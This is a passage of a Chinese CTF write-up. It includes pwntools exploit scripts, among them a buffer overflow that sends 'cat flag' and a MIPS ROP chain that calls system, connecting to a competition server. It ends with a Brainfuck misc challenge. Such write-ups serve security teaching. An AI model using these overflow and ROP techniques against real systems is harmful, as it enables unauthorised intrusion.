class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>io<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">)</span>\n\n\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token number\">72</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x4018e5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x405bcc</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x04018FC</span><span class=\"token punctuation\">)</span>\n\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\n\nsh<span class=\"token operator\">=</span><span class=\"token number\">0x6873</span>\n<span class=\"token keyword\">while</span> sh<span class=\"token operator\">></span><span class=\"token number\">10000</span><span class=\"token punctuation\">:</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token string\">\"10000\"</span><span class=\"token punctuation\">)</span>\n        sl<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\n        sh<span class=\"token operator\">-=</span><span class=\"token number\">10000</span>\n\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"6739\"</span><span class=\"token punctuation\">)</span>\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"3\"</span><span class=\"token punctuation\">)</span>\n\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"4\"</span><span class=\"token punctuation\">)</span>\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#debug()</span>\ns<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n\nsl<span class=\"token punctuation\">(</span><span class=\"token string\">\"cat flag 1>&amp;2\"</span><span class=\"token punctuation\">)</span>\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n\n\n<h3 id=\"EZ-3-0\"><a href=\"#EZ-3-0\" class=\"headerlink\" title=\"EZ 3.0\"></a>EZ 3.0</h3><p>mips rop</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token number\">0x00400a20</span> <span class=\"token punctuation\">:</span> lw $a0<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">(</span>$sp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span> lw $t9<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">(</span>$sp<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span> jalr $t9 <span class=\"token punctuation\">;</span> nop</code></pre>\n\n<p>这gadget可以把a0和t9控制，再跳到t9，a0为函数参数。把a0变成&#x2F;bin&#x2F;cat flag.txt，t9变成system</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\ncontext<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'mips'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">)</span>\ncontext<span class=\"token punctuation\">.</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">\"INFO\"</span>\ncontext<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"tmux\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"splitw\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-h\"</span><span class=\"token punctuation\">]</span>\n<span class=\"token comment\">#io=process([\"qemu-mipsel\",\"-g\",\"1234\",\"./ez\"])</span>\nio<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"47.94.15.198\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">26720</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#a=process(\"./ez\")</span>\n\nr <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nrl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>    a<span class=\"token operator\">=</span><span class=\"token boolean\">False</span>        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span>\nru <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>    <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\ns <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsl <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\nsa <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span>\nshell <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> io<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">debug</span><span class=\"token punctuation\">(</span>script<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\tgdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> gdbscript<span class=\"token operator\">=</span>script<span class=\"token punctuation\">,</span>arch<span class=\"token operator\">=</span><span class=\"token string\">\"mips\"</span><span class=\"token punctuation\">)</span>\n\ncat<span class=\"token operator\">=</span><span class=\"token number\">0x0411010</span>\ngadget<span class=\"token operator\">=</span><span class=\"token number\">0x00400a20</span>\n\n<span class=\"token comment\">#p=\"A\"*(32+4*1)+p32(0x004009c8)</span>\np<span class=\"token operator\">=</span><span class=\"token string\">\"A\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>gadget<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>cat<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span><span class=\"token number\">0x400b70</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>cat<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">#pause()</span>\n\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">\">\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n\nshell<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre>\n\n<h2 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h2><h3 id=\"签个到吧\"><a href=\"#签个到吧\" class=\"headerlink\" title=\"签个到吧\"></a>签个到吧</h3><pre class=\"language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token operator\">></span>+++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>.<span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>.<span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>.<span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>.<span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span>.<span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span><span class=\"token operator\">></span>+++++++++++++++++++++++++<span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>+++++<span class=\"token operator\">></span>-+-+-+-<span class=\"token punctuation\">]</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">[</span>-<span class=\"token punctuation\">]</span></code></pre>\n\n<p>BrainFuck，但是观察到没有 <code>.</code> 来输出，在每部分后加上即可</p>\n<pre class=\"language-vbnet\" data-language=\"vbnet\"><code class=\"language-vbnet\"><span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token 